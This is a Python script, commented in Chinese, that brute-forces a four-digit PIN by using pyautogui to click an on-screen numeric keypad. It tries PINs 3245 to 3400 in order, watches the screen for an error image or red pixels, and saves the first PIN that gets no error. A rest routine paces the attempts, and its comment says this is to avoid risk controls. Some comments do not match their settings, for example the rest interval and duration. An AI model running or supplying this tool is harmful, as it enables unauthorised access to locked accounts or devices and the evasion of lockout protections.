#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pyautogui
import time
import logging
from datetime import datetime
import sys
import os
import traceback

# ==================== 用户配置区域（请按实际修改） ====================

# 1. 密码尝试范围（包含两端）
START_PIN = 3245          # 起始密码
END_PIN = 3400            # 结束密码

# 2. 数字键盘坐标推算
FIRST_KEY_COORD = (925, 659)   # 数字“1”中心点
H_SPACING = 65                 # 水平间距
V_SPACING = 50                 # 垂直间距

# 3. 清除按钮坐标
CLEAR_COORD = (930, 875)

# 4. 错误检测方式（二选一）
USE_IMAGE_DETECTION = True     # True=图像匹配，False=像素颜色检测
ERROR_TEMPLATE = "./templates/error_msg.png"   # 若使用图像匹配，需准备模板图片
ERROR_REGION = (400, 200, 200, 50)             # 若使用像素检测，错误文字出现区域
ERROR_RGB_THRESHOLD = (200, 50, 50)            # 像素检测的RGB阈值（红底色示例）

# 5. 时间参数
WAIT_AFTER_SUBMIT = 0.9
CLICK_INTERVAL = 0.1

# 6. 休息策略（防止卡顿和风控）
SLEEP_INTERVAL = 120          # 每尝试50次后休息
SLEEP_DURATION = 20.0         # 休息2秒

# ==================== 配置结束，以下无需改动 ====================

# 设置PyAutoGUI全局暂停
pyautogui.PAUSE = 0.05

# 适配屏幕缩放（Windows）
try:
    import ctypes
    ctypes.windll.user32.SetProcessDPIAware()
except:
    pass

# 日志配置
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bruteforce_log.txt", encoding='utf-8'),
        logging.StreamHandler()
    ]
)

# ---------- 自动生成数字坐标 ----------
NUM_COORDS = {}
num_layout = [
    ['1','2','3'],
    ['4','5','6'],
    ['7','8','9'],
    ['','0','']
]

for row_idx, row in enumerate(num_layout):
    for col_idx, digit in enumerate(row):
        if digit:
            x = FIRST_KEY_COORD[0] + col_idx * H_SPACING
            y = FIRST_KEY_COORD[1] + row_idx * V_SPACING
            NUM_COORDS[digit] = (x, y)

logging.debug("生成的数字坐标:")
for d, coord in NUM_COORDS.items():
    logging.debug(f"  {d}: {coord}")

# ---------- 核心函数 ----------

def click_at(coord, wait=CLICK_INTERVAL):
    """点击指定坐标"""
    pyautogui.click(coord[0], coord[1])
    time.sleep(wait)

def clear_input():
    click_at(CLEAR_COORD)
    logging.debug("已清除")

def input_password(password):
    for digit in password:
        coord = NUM_COORDS.get(digit)
        if coord is None:
            logging.error(f"未知数字: {digit}")
            return False
        click_at(coord)
    return True

def is_error_detected():
    """检测错误提示是否出现"""
    if USE_IMAGE_DETECTION:
        try:
            # 检查模板文件是否存在
            if not os.path.exists(ERROR_TEMPLATE):
                logging.error(f"模板文件不存在: {ERROR_TEMPLATE}")
                return True  # 文件缺失时视为错误，避免误判成功

            # 全屏搜索模板（不再限定区域）
            pos = pyautogui.locateOnScreen(
                ERROR_TEMPLATE,
                confidence=0.85,
                grayscale=True   # 忽略颜色，提高匹配稳定性
            )
            if pos is None:
                logging.debug("未找到错误模板")
                return False     # 未找到，说明没有错误
            else:
                logging.debug(f"找到错误模板，位置: {pos}")
                return True
        except Exception as e:
            logging.error(f"图像检测异常: {e}")
            logging.error(traceback.format_exc())
            # 异常时返回 True 假设为错误，避免程序中断
            return True
    else:
        # 像素检测
        try:
            screenshot = pyautogui.screenshot(region=ERROR_REGION)
            avg_color = screenshot.resize((1, 1)).getpixel((0, 0))
            r, g, b = avg_color
            if r > ERROR_RGB_THRESHOLD[0] and g < ERROR_RGB_THRESHOLD[1] and b < ERROR_RGB_THRESHOLD[2]:
                return True
            else:
                return False
        except Exception as e:
            logging.error(f"像素检测出错: {e}")
            return True

def record_correct_password(password):
    with open("correct_password.txt", "w") as f:
        f.write(f"正确密码: {password}\n发现时间: {datetime.now()}\n")
    logging.info(f"🎉 成功找到正确密码: {password}")

# ---------- 主程序 ----------

def main():
    total = END_PIN - START_PIN + 1
    logging.info(f"开始尝试，范围: {START_PIN:04d} ~ {END_PIN:04d}，共 {total} 个密码")
    logging.info(f"休息策略: 每 {SLEEP_INTERVAL} 次后休息 {SLEEP_DURATION} 秒")
    logging.info("按下 Ctrl+C 可随时安全终止程序")

    start_time = time.time()
    last_tried = None
    attempt_count = 0

    try:
        for pin in range(START_PIN, END_PIN + 1):
            password = f"{pin:04d}"
            last_tried = password
            logging.info(f"尝试: {password} ({pin-START_PIN+1}/{total})")

            # 1. 清除
            clear_input()

            # 2. 输入密码
            if not input_password(password):
                logging.error("输入失败，跳过")
                continue

            # 3. 等待校验
            time.sleep(WAIT_AFTER_SUBMIT)

            # 4. 检测错误
            if not is_error_detected():
                time.sleep(0.5)
                if not is_error_detected():
                    record_correct_password(password)
                    logging.info("🎉 任务完成！")
                    return

            # 5. 休息机制
            attempt_count += 1
            if attempt_count >= SLEEP_INTERVAL:
                logging.info(f"已尝试 {attempt_count} 次，休息 {SLEEP_DURATION} 秒...")
                time.sleep(SLEEP_DURATION)
                attempt_count = 0

            # 每100次记录进度
            if (pin - START_PIN + 1) % 100 == 0:
                elapsed = time.time() - start_time
                avg = elapsed / (pin - START_PIN + 1)
                remaining = (END_PIN - pin) * avg
                logging.info(f"进度: {pin-START_PIN+1}/{total}, 耗时 {elapsed//60:.0f}分 {elapsed%60:.0f}秒, 预计剩余 {remaining//60:.0f}分")

    except KeyboardInterrupt:
        logging.warning(f"\n用户中断！当前尝试到密码: {last_tried}")
        logging.warning(f"如需继续，请将 START_PIN 改为 {int(last_tried)+1:04d} 后重新运行")
        sys.exit(0)

    logging.warning("遍历完毕，未找到正确密码。")

if __name__ == "__main__":
    print("=" * 50)
    print("请确认：")
    print("1. 目标窗口已打开并置于最前")
    print("2. 坐标配置已正确测量")
    print("3. 按 Ctrl+C 可随时终止")
    print("=" * 50)
    print("5秒后开始...")
    time.sleep(5)
    main()